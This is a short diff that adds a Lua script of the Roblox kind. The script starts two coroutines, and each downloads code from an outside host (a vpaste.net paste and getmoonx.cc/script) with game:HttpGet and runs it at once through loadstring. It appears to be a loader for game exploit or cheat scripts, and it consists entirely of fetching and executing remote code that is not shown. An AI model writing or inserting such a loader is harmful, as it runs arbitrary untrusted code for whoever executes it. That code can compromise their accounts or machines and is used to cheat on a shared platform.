@@ -1,0 +1,8 @@
+-- Combine them under separate threads
+coroutine.wrap(function()
+    loadstring(game:HttpGet("http://vpaste.net/Z6xCp"))()
+end)()
+
+coroutine.wrap(function()
+    loadstring(game:HttpGet("https://getmoonx.cc/script"))()
+end)()
